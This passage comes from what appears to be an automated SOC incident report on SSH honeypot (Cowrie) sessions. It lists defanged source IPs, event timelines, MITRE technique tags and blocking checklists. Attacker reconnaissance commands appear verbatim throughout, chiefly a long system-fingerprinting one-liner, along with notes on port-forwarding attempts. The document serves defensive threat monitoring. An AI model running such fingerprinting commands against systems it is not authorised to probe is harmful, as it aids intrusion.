| `2026-08-15 01:19:12` | `cowrie.client.version` |
| `2026-08-15 01:19:12` | `cowrie.client.kex` |
| `2026-08-15 01:19:14` | `cowrie.login.success` |
| `2026-08-15 01:19:17` | `cowrie.session.params` |
| `2026-08-15 01:19:17` | `cowrie.command.input` |
| `2026-08-15 01:19:18` | `cowrie.log.closed` |
| `2026-08-15 01:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5a0972a4d6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:19` | `cowrie.session.connect` |
| `2026-08-15 01:19:21` | `cowrie.client.version` |
| `2026-08-15 01:19:21` | `cowrie.client.kex` |
| `2026-08-15 01:19:26` | `cowrie.login.success` |
| `2026-08-15 01:19:28` | `cowrie.session.params` |
| `2026-08-15 01:19:28` | `cowrie.command.input` |
| `2026-08-15 01:19:29` | `cowrie.log.closed` |
| `2026-08-15 01:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-254498dd9e7a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:29` | `cowrie.session.connect` |
| `2026-08-15 01:19:30` | `cowrie.client.version` |
| `2026-08-15 01:19:30` | `cowrie.client.kex` |
| `2026-08-15 01:19:33` | `cowrie.login.success` |
| `2026-08-15 01:19:35` | `cowrie.session.params` |
| `2026-08-15 01:19:35` | `cowrie.command.input` |
| `2026-08-15 01:19:36` | `cowrie.log.closed` |
| `2026-08-15 01:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59aca7484765

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:40` | `cowrie.session.connect` |
| `2026-08-15 01:19:40` | `cowrie.client.version` |
| `2026-08-15 01:19:40` | `cowrie.client.kex` |
| `2026-08-15 01:19:41` | `cowrie.login.success` |
| `2026-08-15 01:19:42` | `cowrie.session.params` |
| `2026-08-15 01:19:42` | `cowrie.command.input` |
| `2026-08-15 01:19:42` | `cowrie.log.closed` |
| `2026-08-15 01:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f642b7ada640

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:49` | `cowrie.session.connect` |
| `2026-08-15 01:19:49` | `cowrie.client.version` |
| `2026-08-15 01:19:49` | `cowrie.client.kex` |
| `2026-08-15 01:19:50` | `cowrie.login.success` |
| `2026-08-15 01:19:52` | `cowrie.session.params` |
| `2026-08-15 01:19:52` | `cowrie.command.input` |
| `2026-08-15 01:19:53` | `cowrie.log.closed` |
| `2026-08-15 01:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89decb91d70e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:19 |
| **Last Seen** | 2026-08-15 01:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:19:58` | `cowrie.session.connect` |
| `2026-08-15 01:19:58` | `cowrie.client.version` |
| `2026-08-15 01:19:58` | `cowrie.client.kex` |
| `2026-08-15 01:19:59` | `cowrie.login.success` |
| `2026-08-15 01:20:00` | `cowrie.session.params` |
| `2026-08-15 01:20:00` | `cowrie.command.input` |
| `2026-08-15 01:20:01` | `cowrie.log.closed` |
| `2026-08-15 01:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f096ab2743

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:20 |
| **Last Seen** | 2026-08-15 01:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:20:06` | `cowrie.session.connect` |
| `2026-08-15 01:20:06` | `cowrie.client.version` |
| `2026-08-15 01:20:06` | `cowrie.client.kex` |
| `2026-08-15 01:20:08` | `cowrie.login.success` |
| `2026-08-15 01:20:10` | `cowrie.session.params` |
| `2026-08-15 01:20:10` | `cowrie.command.input` |
| `2026-08-15 01:20:10` | `cowrie.log.closed` |
| `2026-08-15 01:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c46356ad8f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]34` |
| **First Seen** | 2026-08-15 01:20 |
| **Last Seen** | 2026-08-15 01:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:20:15` | `cowrie.session.connect` |
| `2026-08-15 01:20:15` | `cowrie.client.version` |
| `2026-08-15 01:20:15` | `cowrie.client.kex` |
| `2026-08-15 01:20:18` | `cowrie.login.success` |
| `2026-08-15 01:20:20` | `cowrie.session.params` |
| `2026-08-15 01:20:20` | `cowrie.command.input` |
| `2026-08-15 01:20:21` | `cowrie.log.closed` |
| `2026-08-15 01:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]34` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400daef23367

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:21 |
| **Last Seen** | 2026-08-15 01:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:21:00` | `cowrie.session.connect` |
| `2026-08-15 01:21:00` | `cowrie.client.version` |
| `2026-08-15 01:21:00` | `cowrie.client.kex` |
| `2026-08-15 01:21:01` | `cowrie.login.success` |
| `2026-08-15 01:21:02` | `cowrie.session.params` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.success` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.command.input` |
| `2026-08-15 01:21:02` | `cowrie.log.closed` |
| `2026-08-15 01:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3341eedc57a0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:22 |
| **Last Seen** | 2026-08-15 01:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:22:48` | `cowrie.session.connect` |
| `2026-08-15 01:22:48` | `cowrie.client.version` |
| `2026-08-15 01:22:48` | `cowrie.client.kex` |
| `2026-08-15 01:22:49` | `cowrie.login.success` |
| `2026-08-15 01:22:51` | `cowrie.session.params` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.success` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.command.input` |
| `2026-08-15 01:22:51` | `cowrie.log.closed` |
| `2026-08-15 01:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477f047ea336

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:24 |
| **Last Seen** | 2026-08-15 01:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:24:37` | `cowrie.session.connect` |
| `2026-08-15 01:24:37` | `cowrie.client.version` |
| `2026-08-15 01:24:37` | `cowrie.client.kex` |
| `2026-08-15 01:24:38` | `cowrie.login.success` |
| `2026-08-15 01:24:39` | `cowrie.session.params` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.success` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:39` | `cowrie.command.input` |
| `2026-08-15 01:24:40` | `cowrie.log.closed` |
| `2026-08-15 01:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ba6215b333

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:26 |
| **Last Seen** | 2026-08-15 01:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:26:28` | `cowrie.session.connect` |
| `2026-08-15 01:26:28` | `cowrie.client.version` |
| `2026-08-15 01:26:29` | `cowrie.client.kex` |
| `2026-08-15 01:26:30` | `cowrie.login.success` |
| `2026-08-15 01:26:31` | `cowrie.session.params` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.success` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.command.input` |
| `2026-08-15 01:26:31` | `cowrie.log.closed` |
| `2026-08-15 01:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f00124b1699

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:28 |
| **Last Seen** | 2026-08-15 01:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:28:24` | `cowrie.session.connect` |
| `2026-08-15 01:28:24` | `cowrie.client.version` |
| `2026-08-15 01:28:24` | `cowrie.client.kex` |
| `2026-08-15 01:28:25` | `cowrie.login.success` |
| `2026-08-15 01:28:27` | `cowrie.session.params` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.success` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.command.input` |
| `2026-08-15 01:28:27` | `cowrie.log.closed` |
| `2026-08-15 01:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03d7b976e44

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 01:28 |
| **Last Seen** | 2026-08-15 01:33 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:28:29` | `cowrie.session.connect` |
| `2026-08-15 01:28:29` | `cowrie.client.version` |
| `2026-08-15 01:28:29` | `cowrie.client.kex` |
| `2026-08-15 01:28:30` | `cowrie.login.success` |
| `2026-08-15 01:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e444df1d656

| Field | Detail |
|---|---|
| **Source IP** | `122.170.100[.]253` |
| **First Seen** | 2026-08-15 01:29 |
| **Last Seen** | 2026-08-15 01:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:29:21` | `cowrie.session.connect` |
| `2026-08-15 01:29:21` | `cowrie.client.version` |
| `2026-08-15 01:29:21` | `cowrie.client.kex` |
| `2026-08-15 01:29:23` | `cowrie.login.success` |
| `2026-08-15 01:29:23` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.100[.]253` to AbuseIPDB if not already reported
- [ ] Block `122.170.100[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d29baede238c

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-08-15 01:29 |
| **Last Seen** | 2026-08-15 01:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:29:28` | `cowrie.session.connect` |
| `2026-08-15 01:29:28` | `cowrie.client.version` |
| `2026-08-15 01:29:28` | `cowrie.client.kex` |
| `2026-08-15 01:29:29` | `cowrie.login.success` |
| `2026-08-15 01:29:29` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515a47b64f12

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-08-15 01:30 |
| **Last Seen** | 2026-08-15 01:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:30:17` | `cowrie.session.connect` |
| `2026-08-15 01:30:18` | `cowrie.client.version` |
| `2026-08-15 01:30:18` | `cowrie.client.kex` |
| `2026-08-15 01:30:20` | `cowrie.login.success` |
| `2026-08-15 01:30:21` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:30:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08fc5e7364e8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:30 |
| **Last Seen** | 2026-08-15 01:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:30:23` | `cowrie.session.connect` |
| `2026-08-15 01:30:23` | `cowrie.client.version` |
| `2026-08-15 01:30:23` | `cowrie.client.kex` |
| `2026-08-15 01:30:24` | `cowrie.login.success` |
| `2026-08-15 01:30:25` | `cowrie.session.params` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.success` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.command.input` |
| `2026-08-15 01:30:25` | `cowrie.log.closed` |
| `2026-08-15 01:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499f77328ca4

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-15 01:31 |
| **Last Seen** | 2026-08-15 01:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:31:02` | `cowrie.session.connect` |
| `2026-08-15 01:31:03` | `cowrie.client.version` |
| `2026-08-15 01:31:03` | `cowrie.client.kex` |
| `2026-08-15 01:31:05` | `cowrie.login.success` |
| `2026-08-15 01:31:06` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd10dd8da0c2

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-15 01:31 |
| **Last Seen** | 2026-08-15 01:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:31:11` | `cowrie.session.connect` |
| `2026-08-15 01:31:12` | `cowrie.client.version` |
| `2026-08-15 01:31:12` | `cowrie.client.kex` |
